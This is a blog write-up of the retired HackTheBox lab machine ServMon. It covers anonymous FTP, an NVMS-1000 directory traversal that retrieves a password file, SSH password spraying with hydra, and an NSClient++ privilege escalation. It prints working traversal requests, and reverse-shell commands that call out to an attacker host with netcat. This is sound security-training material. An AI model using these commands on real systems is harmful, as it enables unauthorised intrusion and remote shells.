<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: ServMon | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/06/htb-servmon.html" title="Read more" class="entry-title-link">
                HTB: ServMon</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-06-21T09:15:00+02:00">21 Jun 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
          <a href="../../tag/exploit.html" title="Read more with the label exploit" class="meta-link">exploit</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 13 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.06/servmon_card.png" alt="ServMon Card" width="262"></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/240">ServMon</a> publish on April
11 2020 by <a href="https://www.hackthebox.com/home/users/profile/82600">dmw0ng</a>.
This box is rated as an easy box. This box is really unstable and can be a pain
as there is a lot of reset on public server. It implies an anonymous FTP, a
<code>Passwords.txt</code> file and two exploits.</p>


<h1 id="user-part">User part</h1>
<h2 id="recon">Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. As often with Windows Boxes, a lot of
port are open. A few interesting services are up:
  * FTP on port 21
  * SSH (for Windows)Â on port 22
  * a Web service on port 80
  * a Web service (with SSL) on port 8433</p>
<p>Here is the full nmap scan:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Wed Apr 15 03:04:29 2020 as: nmap -p- -sSV -oN nmap 10.10.10.184</span>
<span class="code-line">Nmap scan report for 10.10.10.184</span>
<span class="code-line">Host is up (0.013s latency).</span>
<span class="code-line">Not shown: 65515 closed ports</span>
<span class="code-line">PORT      STATE SERVICE       VERSION</span>
<span class="code-line">21/tcp    open  ftp           Microsoft ftpd</span>
<span class="code-line">22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span>
<span class="code-line">80/tcp    open  http</span>
<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span class="code-line">445/tcp   open  microsoft-ds?</span>
<span class="code-line">5040/tcp  open  unknown</span>
<span class="code-line">5666/tcp  open  nrpe?</span>
<span class="code-line">6063/tcp  open  tcpwrapped</span>
<span class="code-line">6699/tcp  open  napster?</span>
<span class="code-line">7680/tcp  open  pando-pub?</span>
<span class="code-line">8443/tcp  open  ssl/https-alt</span>
<span class="code-line">31336/tcp open  nagios-nsca   Nagios NSCA</span>
<span class="code-line">49664/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49665/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49666/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49667/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49668/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49669/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49670/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="code-line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
<span class="code-line">SF-Port80-TCP:V=7.80%I=7%D=4/15%Time=5E96B393%P=x86_64-pc-linux-gnu%r(NULL</span>
<span class="code-line">SF:,6B,&quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht</span>
<span class="code-line">SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n</span>
<span class="code-line">SF:\r\n&quot;)%r(GetRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex</span>
<span class="code-line">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x</span>
<span class="code-line">SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20X</span>
<span class="code-line">SF:HTML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/D</span>
<span class="code-line">SF:TD/xhtml1-transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\.w3\.</span>
<span class="code-line">SF:org/1999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\</span>
<span class="code-line">SF:x20\x20\x20&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x20\x20</span>
<span class="code-line">SF:\x20\x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x2</span>
<span class="code-line">SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;)</span>
<span class="code-line">SF:%r(HTTPOptions,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm</span>
<span class="code-line">SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\</span>
<span class="code-line">SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\</span>
<span class="code-line">SF:x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xh</span>
<span class="code-line">SF:tml1-transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\.w3\.org/1</span>
<span class="code-line">SF:999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x</span>
<span class="code-line">SF:20\x20&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x20\x20\x20\</span>
<span class="code-line">SF:x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20</span>
<span class="code-line">SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;)%r(RT</span>
<span class="code-line">SF:SPRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n</span>
<span class="code-line">SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n</span>
<span class="code-line">SF:\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\</span>
<span class="code-line">SF:.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-</span>
<span class="code-line">SF:transitional\.dtd\&quot;&gt;\r\n\r\n&lt;html\x20xmlns=\&quot;http://www\.w3\.org/1999/x</span>
<span class="code-line">SF:html\&quot;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x20\x2</span>
<span class="code-line">SF:0&lt;script\x20type=\&quot;text/javascript\&quot;&gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x</span>
<span class="code-line">SF:20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20\x20\</span>
<span class="code-line">SF:x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&quot;);</span>
<span class="code-line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
<span class="code-line">SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/15%Time=5E96B39B%P=x86_64-pc-linux-gn</span>
<span class="code-line">SF:u%r(GetRequest,E8,&quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation</span>
<span class="code-line">SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span>
<span class="code-line">SF:\0\0\0\0\0\0\&quot;:{\&quot;context\&quot;:\&quot;ini://\${shared-path}/nsclient\.ini\&quot;,\&quot;h</span>
<span class="code-line">SF:as_changed\&quot;:false,\&quot;type\&quot;:\&quot;ini\&quot;}}\]}\0\0\x20keyword\x20to\x20the\x2</span>
<span class="code-line">SF:0message\x20you\x20can\x20use\x20two\x20syntaxes\x20either\x20\${&quot;)%r(H</span>
<span class="code-line">SF:TTPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen</span>
<span class="code-line">SF:t\x20not\x20found&quot;)%r(FourOhFourRequest,36,&quot;HTTP/1\.1\x20404\r\nContent</span>
<span class="code-line">SF:-Length:\x2018\r\n\r\nDocument\x20not\x20found&quot;)%r(RTSPRequest,36,&quot;HTTP</span>
<span class="code-line">SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&quot;)</span>
<span class="code-line">SF:%r(SIPOptions,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocu</span>
<span class="code-line">SF:ment\x20not\x20found&quot;);</span>
<span class="code-line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Wed Apr 15 03:14:06 2020 -- 1 IP address (1 host up) scanned in 577.24 seconds</span>
<span class="code-line"></code></pre></div>

<h2 id="ftp">FTP</h2>
<p>Using firefox we can easily connect to the FTP service with an anonymous account.</p>
<p><img alt="Connecting to ftp" src="/media/2020.06/servmon_01.png"></p>
<p>We found two files:
* Users/Nadine/confidentiel.txt
* Users/Nathan/Notes to do.txt</p>
<p>The first one contain the following:</p>
<blockquote>
<p>Nathan,</p>
<p>I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.</p>
<p>Regards</p>
<p>Nadine</p>
</blockquote>
<p>The second on contain some TODO list:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>1) Change the password for NVMS - Complete</span>
<span class="code-line">2) Lock down the NSClient Access - Complete</span>
<span class="code-line">3) Upload the passwords</span>
<span class="code-line">4) Remove public access to NVMS</span>
<span class="code-line">5) Place the secret files in SharePoint</span>
<span class="code-line"></code></pre></div>

<p>Therefore we know that there is a <code>Passwords.txt</code> file on Nathan's desktop and
that there is two web services : NSClient and NVMS.</p>
<h2 id="http">HTTP</h2>
<p>On port 80 we found the NVSM web services with an authentication form.</p>
<p><img alt="NVMS 1000 authentication form" src="/media/2020.06/servmon_02.png"></p>
<p>We look at the available exploit for NVMS and we found only one about a
directory traversal.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ searchsploit NVMS</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line">Exploit Title                         |  Path</span>
<span class="code-line">                                      | (/usr/share/exploitdb/)</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line">NVMS 1000 - Directory Traversal        | exploits/hardware/webapps/47774.txt</span>
<span class="code-line">OpenVms 5.3/6.2/7.x - UCX POP Server A | exploits/multiple/local/21856.txt</span>
<span class="code-line">OpenVms 8.3 Finger Service - Stack Buf | exploits/multiple/dos/32193.txt</span>
<span class="code-line">--------------------------------------- ----------------------------------------</span>
<span class="code-line">Shellcodes: No Result</span>
<span class="code-line"></span>
<span class="code-line">kali@kali:~$ cat /usr/share/exploitdb/exploits/hardware/webapps/47774.txt</span>
<span class="code-line"># Title: NVMS-1000 - Directory Traversal</span>
<span class="code-line"># Date: 2019-12-12</span>
<span class="code-line"># Author: Numan TÃ¼rle</span>
<span class="code-line"># Vendor Homepage: http://en.tvt.net.cn/</span>
<span class="code-line"># Version : N/A</span>
<span class="code-line"># Software Link : http://en.tvt.net.cn/products/188.html</span>
<span class="code-line"></span>
<span class="code-line">POC</span>
<span class="code-line">---------</span>
<span class="code-line"></span>
<span class="code-line">GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1</span>
<span class="code-line">Host: 12.0.0.1</span>
<span class="code-line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span>
<span class="code-line">Accept-Encoding: gzip, deflate</span>
<span class="code-line">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7</span>
<span class="code-line">Connection: close</span>
<span class="code-line"></span>
<span class="code-line">Response</span>
<span class="code-line">---------</span>
<span class="code-line"></span>
<span class="code-line">; for 16-bit app support</span>
<span class="code-line">[fonts]</span>
<span class="code-line">[extensions]</span>
<span class="code-line">[mci extensions]</span>
<span class="code-line">[files]</span>
<span class="code-line">[Mail]</span>
<span class="code-line">MAPI=1</span>
<span class="code-line"></code></pre></div>

<p>We fire up burp and make the same request as in the POC (changing the host
obviously). We got the <code>win.ini</code> file.</p>
<p>We then change our request to get the content of the <code>Passwords.txt</code> file on
Nathan's desktop which give us seven passwords.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.184</span>
<span class="code-line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span>
<span class="code-line">Accept-Encoding: gzip, deflate</span>
<span class="code-line">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7</span>
<span class="code-line">Connection: close</span>
<span class="code-line"></span>
<span class="code-line">HTTP/1.1 200 OK</span>
<span class="code-line">Content-type: text/plain</span>
<span class="code-line">Content-Length: 156</span>
<span class="code-line">Connection: close</span>
<span class="code-line">AuthInfo:</span>
<span class="code-line"></span>
<span class="code-line">1nsp3ctTh3Way2Mars!</span>
<span class="code-line">Th3r34r3To0M4nyTrait0r5!</span>
<span class="code-line">B3WithM30r4ga1n5tMe</span>
<span class="code-line">L1k3B1gBut7s@W0rk</span>
<span class="code-line">0nly7h3y0unGWi11F0l10w</span>
<span class="code-line">IfH3s4b0Utg0t0H1sH0me</span>
<span class="code-line">Gr4etN3w5w17hMySk1Pa5$</span>
<span class="code-line"></code></pre></div>

<p>We try this passwords against the NVMS authentication form but without success.</p>
<h2 id="ssh">SSH</h2>
<p>As there is other services, we try our seven password against the SSH service.
We have two users <code>nathan</code> and <code>nadine</code>. Using <code>hydra</code> we easily find the creds
for nadine's SSH account.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_servmon$ hydra -l nathan -P pass ssh://10.10.10.184</span>
<span class="code-line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span>
<span class="code-line"></span>
<span class="code-line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:14</span>
<span class="code-line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
<span class="code-line">[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task</span>
<span class="code-line">[DATA] attacking ssh://10.10.10.184:22/</span>
<span class="code-line">1 of 1 target completed, 0 valid passwords found</span>
<span class="code-line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:19</span>
<span class="code-line">kali@kali:~/pown/htb_servmon$ hydra -l nadine -P pass ssh://10.10.10.184</span>
<span class="code-line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span>
<span class="code-line"></span>
<span class="code-line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:26</span>
<span class="code-line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
<span class="code-line">[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task</span>
<span class="code-line">[DATA] attacking ssh://10.10.10.184:22/</span>
<span class="code-line">[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk</span>
<span class="code-line">1 of 1 target successfully completed, 1 valid password found</span>
<span class="code-line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:35</span>
<span class="code-line"></code></pre></div>

<p>We can the connect to the server using SSH and get the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_servmon$ ssh nadine@10.10.10.184</span>
<span class="code-line">Microsoft Windows [Version 10.0.18363.752]</span>
<span class="code-line">(c) 2019 Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">nadine@SERVMON C:\Users\Nadine&gt;type Desktop\user.txt</span>
<span class="code-line">e9aa044247ca285bb777782d7b0cfdfd</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<p>For the root part we need to exploit the NSClient on port 8443 as there is a
privilege escalation vulnerability.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ searchsploit NSclient</span>
<span class="code-line">---------------------------------------------------- ----------------------------------------</span>
<span class="code-line">Exploit Title                                      |  Path</span>
<span class="code-line">                                                    | (/usr/share/exploitdb/)</span>
<span class="code-line">---------------------------------------------------- ----------------------------------------</span>
<span class="code-line">NSClient++ 0.5.2.35 - Privilege Escalation          | exploits/windows/local/46802.txt</span>
<span class="code-line">---------------------------------------------------- ----------------------------------------</span>
<span class="code-line">Shellcodes: No Result</span>
<span class="code-line">kali@kali:~$ cat /usr/share/exploitdb/exploits/windows/local/46802.txt</span>
<span class="code-line">Exploit Author: bzyo</span>
<span class="code-line">Twitter: @bzyo_</span>
<span class="code-line">Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation</span>
<span class="code-line">Date: 05-05-19</span>
<span class="code-line">Vulnerable Software: NSClient++ 0.5.2.35</span>
<span class="code-line">Vendor Homepage: http://nsclient.org/</span>
<span class="code-line">Version: 0.5.2.35</span>
<span class="code-line">Software Link: http://nsclient.org/download/</span>
<span class="code-line">Tested on: Windows 10 x64</span>
<span class="code-line"></span>
<span class="code-line">Details:</span>
<span class="code-line">When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator&#39;s password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.</span>
<span class="code-line"></span>
<span class="code-line">The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&#39;t seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.</span>
<span class="code-line"></span>
<span class="code-line">Prerequisites:</span>
<span class="code-line">To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.</span>
<span class="code-line"></span>
<span class="code-line">Exploit:</span>
<span class="code-line">1. Grab web administrator password</span>
<span class="code-line">- open c:\program files\nsclient++\nsclient.ini</span>
<span class="code-line">or</span>
<span class="code-line">- run the following that is instructed when you select forget password</span>
<span class="code-line">        C:\Program Files\NSClient++&gt;nscp web -- password --display</span>
<span class="code-line">        Current password: SoSecret</span>
<span class="code-line"></span>
<span class="code-line">2. Login and enable following modules including enable at startup and save configuration</span>
<span class="code-line">- CheckExternalScripts</span>
<span class="code-line">- Scheduler</span>
<span class="code-line"></span>
<span class="code-line">3. Download nc.exe and evil.bat to c:\temp from attacking machine</span>
<span class="code-line">        @echo off</span>
<span class="code-line">        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe</span>
<span class="code-line"></span>
<span class="code-line">4. Setup listener on attacking machine</span>
<span class="code-line">        nc -nlvvp 443</span>
<span class="code-line"></span>
<span class="code-line">5. Add script foobar to call evil.bat and save settings</span>
<span class="code-line">- Settings &gt; External Scripts &gt; Scripts</span>
<span class="code-line">- Add New</span>
<span class="code-line">        - foobar</span>
<span class="code-line">                command = c:\temp\evil.bat</span>
<span class="code-line"></span>
<span class="code-line">6. Add schedulede to call script every 1 minute and save settings</span>
<span class="code-line">- Settings &gt; Scheduler &gt; Schedules</span>
<span class="code-line">- Add new</span>
<span class="code-line">        - foobar</span>
<span class="code-line">                interval = 1m</span>
<span class="code-line">                command = foobar</span>
<span class="code-line"></span>
<span class="code-line">7. Restart the computer and wait for the reverse shell on attacking machine</span>
<span class="code-line">        nc -nlvvp 443</span>
<span class="code-line">        listening on [any] 443 ...</span>
<span class="code-line">        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671</span>
<span class="code-line">        Microsoft Windows [Version 10.0.17134.753]</span>
<span class="code-line">        (c) 2018 Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">        C:\Program Files\NSClient++&gt;whoami</span>
<span class="code-line">        whoami</span>
<span class="code-line">        nt authority\system</span>
<span class="code-line"></code></pre></div>

<p>First of all we get the password for the NSClient and the content of
<code>nsclient.ini</code> in order to see the access restriction. The application is only
available from localhost.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>nadine@SERVMON C:\&gt;cd &quot;C:\Program Files\NSClient++&quot;</span>
<span class="code-line"></span>
<span class="code-line">nadine@SERVMON C:\Program Files\NSClient++&gt;nscp web -- password --display</span>
<span class="code-line">Current password: ew2x6SsGTxjRwXOT</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">nadine@SERVMON C:\Program Files\NSClient++&gt;type nsclient.ini</span>
<span class="code-line">Â´ââ# If you want to fill this file with all available options run the following command:</span>
<span class="code-line">#   nscp settings --generate --add-defaults --load-all</span>
<span class="code-line"># If you want to activate a module and bring in all its options use:</span>
<span class="code-line">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults</span>
<span class="code-line"># For details run: nscp settings --help</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">; in flight - TODO</span>
<span class="code-line">[/settings/default]</span>
<span class="code-line"></span>
<span class="code-line">; Undocumented key</span>
<span class="code-line">password = ew2x6SsGTxjRwXOT</span>
<span class="code-line"></span>
<span class="code-line">; Undocumented key</span>
<span class="code-line">allowed hosts = 127.0.0.1</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></code></pre></div>

<p>Then we upload <code>nc.exe</code> from <code>/usr/share/windows-binaries</code> using a python simple
http server.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>nadine@SERVMON C:\Temp&gt;curl http://10.10.14.200:8081/nc.exe -o nc.exe</span>
<span class="code-line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span>
<span class="code-line">                                Dload  Upload   Total   Spent    Left  Speed</span>
<span class="code-line">100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  264k</span>
<span class="code-line"></code></pre></div>

<p>We know that the NSClient is only available from localhost. So we mount an SSH
tunnel (<code>-D</code> option) and use it as a socks proxy in our browser. Nevertheless
the application is buggy and unstable from a web browser (either Firefox, Chromium or Chrome).</p>
<p>Therefore we use the <a href="https://docs.nsclient.org/api/">NSClient API</a> directly
from our SSH connection (or we can use <code>proxychains</code> with our SOCKS tunnel)
in order to put a simple script that will call our netcat binary.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>nadine@SERVMON C:\Temp&gt;curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/me.bat --data-binary &quot;C:\Temp\nc.exe 10.10.14.200 443 -e cmd.exe&quot;</span>
<span class="code-line">Enter host password for user &#39;admin&#39;:</span>
<span class="code-line">Added me as scripts\me.bat</span>
<span class="code-line">nadine@SERVMON C:\Temp&gt;curl -s -k -u admin https://localhost:8443/api/v1/queries</span>
<span class="code-line">Enter host password for user &#39;admin&#39;:</span>
<span class="code-line">[{&quot;description&quot;:&quot;Check status of scheduled jobs.&quot;,&quot;metadata&quot;:{},&quot;name&quot;:&quot;check_tasksched&quot;,&quot;query_url&quot;:&quot;https://localhost:8443/api/v1/queries/check_tasksched/&quot;,&quot;title&quot;:&quot;check_tasksched&quot;},{&quot;description&quot;:&quot;Legacy version of check_tasksched&quot;,&quot;m</span>
<span class="code-line">etadata&quot;:{},&quot;name&quot;:&quot;checktasksched&quot;,&quot;query_url&quot;:&quot;https://localhost:8443/api/v1/queries/checktasksched/&quot;,&quot;title&quot;:&quot;CheckTaskSched&quot;},{&quot;description&quot;:&quot;External script: scripts\\me.bat&quot;,&quot;metadata&quot;:{},&quot;name&quot;:&quot;me&quot;,&quot;query_url&quot;:&quot;https://localhost:8</span>
<span class="code-line">443/api/v1/queries/me/&quot;,&quot;title&quot;:&quot;me&quot;},{&quot;description&quot;:&quot;External script: scripts\\rvsh.bat&quot;,&quot;metadata&quot;:{},&quot;name&quot;:&quot;rvsh&quot;,&quot;query_url&quot;:&quot;https://localhost:8443/api/v1/queries/rvsh/&quot;,&quot;title&quot;:&quot;rvsh&quot;}]</span>
<span class="code-line"></code></pre></div>

<p>Then we run a listener on our box and at the same time we call our command. This
give a shell as administrator on the box and we are able to retrieve the root
flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>nadine@SERVMON C:\Temp&gt;curl -s -k -u admin &quot;https://localhost:8443/api/v1/queries/me/commands/execute?time=3m&quot;</span>
<span class="code-line">Enter host password for user &#39;admin&#39;:</span>
<span class="code-line"></span>
<span class="code-line">kali@kali:~/pown/htb_servmon/srv$ sudo nc -l -p 443</span>
<span class="code-line">Microsoft Windows [Version 10.0.18363.752]</span>
<span class="code-line">(c) 2019 Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">C:\Program Files\NSClient++&gt;type C:\Users\Administrator\Desktop\root.txt</span>
<span class="code-line">type C:\Users\Administrator\Desktop\root.txt</span>
<span class="code-line">f16c1d179c239f4ffe2ea0821759198b</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>What a pain. The box was really unstable on public servers. At the end the box
is not really difficult.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/06/htb-monteverde.html"> HTB: Monteverde </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/07/htb-forwardslash.html"> HTB: Forwardslash </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/osint.html">osint</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
